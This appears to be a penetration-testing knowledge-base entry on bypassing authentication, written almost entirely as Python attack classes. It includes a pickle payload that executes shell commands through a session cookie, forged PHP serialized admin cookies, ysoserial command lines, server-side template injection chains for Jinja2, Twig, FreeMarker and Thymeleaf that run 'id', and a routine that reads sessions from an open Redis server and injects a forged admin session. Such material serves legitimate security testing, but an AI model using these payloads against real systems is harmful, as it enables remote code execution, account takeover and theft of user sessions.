# KB-39: Deserialization & SSTI Auth Bypass

## Overview

Deserialization vulnerabilities in session/token handling and SSTI in auth templates can bypass authentication entirely, leading to RCE through auth flows.

---

## 1. Java Deserialization Auth Bypass

### 1.1 Serialized Session Objects

```python
class DeserializationAuthBypass:
    def __init__(self, target):
        self.target = target

    def test_java_deserialization(self):
        import subprocess
        # Java serialized objects start with ac ed 00 05 (base64: rO0AB)
        # Common in: JSESSIONID, viewState, remember-me cookies
        
        # Check for serialized data in cookies/parameters
        resp = requests.get(f"{self.target}/login")
        for cookie in resp.cookies:
            if cookie.value.startswith('rO0AB') or cookie.value.startswith('H4sIA'):
                print(f"[CRITICAL] Java serialized cookie: {cookie.name}")
                print(f"  Generate payload: ysoserial CommonsCollections1 'whoami'")

    def test_viewstate_deserialization(self):
        resp = requests.get(f"{self.target}/login")
        if '__VIEWSTATE' in resp.text:
            import re
            vs = re.search(r'__VIEWSTATE[^>]*value="([^"]*)"', resp.text)
            if vs:
                viewstate = vs.group(1)
                # Check if ViewState is encrypted/signed
                if not any(x in resp.text for x in ['__VIEWSTATEGENERATOR', '__EVENTVALIDATION']):
                    print("[HIGH] ViewState may not be properly validated")
                # .NET ViewState deserialization -> RCE
                print(f"  Tool: ysoserial.net -g TypeConfuseDelegate -c 'whoami'")

    def test_php_deserialization(self):
        # PHP serialized data in cookies/parameters
        payloads = [
            'O:8:"stdClass":1:{s:4:"role";s:5:"admin";}',
            'a:2:{s:8:"username";s:5:"admin";s:4:"role";s:5:"admin";}',
        ]
        for payload in payloads:
            import base64
            encoded = base64.b64encode(payload.encode()).decode()
            resp = requests.get(f"{self.target}/dashboard",
                                cookies={'session': encoded})
            if resp.status_code == 200:
                print(f"[CRITICAL] PHP deserialization auth bypass!")

    def test_python_pickle(self):
        import pickle, base64
        # Python pickle in session cookies (Flask, Django)
        class Exploit:
            def __reduce__(self):
                import os
                return (os.system, ('id',))
        
        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
        resp = requests.get(f"{self.target}/dashboard",
                            cookies={'session': payload})
        print(f"[*] Pickle injection test: {resp.status_code}")
```

---

## 2. SSTI in Auth Flows

### 2.1 Template Injection in Auth Pages

```python
class SSTIAuthBypass:
    def __init__(self, target):
        self.target = target

    def test_ssti_in_login(self):
        # Test template injection in username/email fields
        # These are often reflected in error messages or welcome pages
        payloads = {
            'Jinja2':    '{{7*7}}',
            'Twig':      '{{7*7}}',
            'FreeMarker':'${7*7}',
            'Thymeleaf': '${7*7}',
            'ERB':       '<%= 7*7 %>',
            'Mako':      '${7*7}',
            'Pebble':    '{{7*7}}',
            'Velocity':  '#set($x=7*7)${x}',
        }
        
        for engine, payload in payloads.items():
            # Test in username field
            resp = requests.post(f"{self.target}/login",
                                 data={'username': payload, 'password': 'test'})
            if '49' in resp.text:
                print(f"[CRITICAL] SSTI ({engine}) in login username!")
                print(f"  Payload: {payload}")

            # Test in registration
            resp = requests.post(f"{self.target}/register",
                                 data={'username': payload, 'email': f'{payload}@test.com',
                                       'password': 'test123'})
            if '49' in resp.text:
                print(f"[CRITICAL] SSTI ({engine}) in registration!")

            # Test in password reset
            resp = requests.post(f"{self.target}/forgot-password",
                                 data={'email': f'{payload}@test.com'})
            if '49' in resp.text:
                print(f"[CRITICAL] SSTI ({engine}) in password reset!")

    def test_ssti_rce_chains(self):
        rce_payloads = {
            'Jinja2': "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            'Twig': "{{['id']|filter('system')}}",
            'FreeMarker': '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            'Thymeleaf': '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x',
        }
        return rce_payloads
```

---

## 3. Redis/Memcached Session Store Attacks

```python
class SessionStoreAttacker:
    def __init__(self, target):
        self.target = target

    def test_redis_session_injection(self, redis_host, redis_port=6379):
        import redis
        r = redis.Redis(host=redis_host, port=redis_port)
        try:
            r.ping()
            print("[CRITICAL] Redis accessible without auth!")
            # List session keys
            keys = r.keys('sess:*') or r.keys('session:*') or r.keys('spring:session:*')
            print(f"[+] Found {len(keys)} session keys")
            
            # Read a session
            for key in keys[:5]:
                data = r.get(key)
                print(f"  {key}: {data[:200] if data else 'empty'}")
            
            # Inject admin session
            import json
            admin_session = json.dumps({"user": "admin", "role": "admin", "authenticated": True})
            r.set("sess:attacker-session-id", admin_session)
            r.expire("sess:attacker-session-id", 86400)
            print("[CRITICAL] Admin session injected into Redis!")
            print("  Use cookie: session=attacker-session-id")
        except Exception as e:
            print(f"[-] Redis: {e}")

    def test_memcached_injection(self, memcached_host, port=11211):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((memcached_host, port))
            sock.send(b'stats\r\n')
            data = sock.recv(4096)
            if b'STAT' in data:
                print("[CRITICAL] Memcached accessible without auth!")
                # Dump session keys
                sock.send(b'stats items\r\n')
                items = sock.recv(4096)
                print(f"  Stats: {items.decode()[:200]}")
        except Exception as e:
            print(f"[-] Memcached: {e}")
        finally:
            sock.close()
```

## References

- ysoserial (Java deserialization)
- ysoserial.net (.NET deserialization)
- PHPGGC (PHP deserialization chains)
- HackTricks SSTI methodology
- Redis/Memcached security documentation
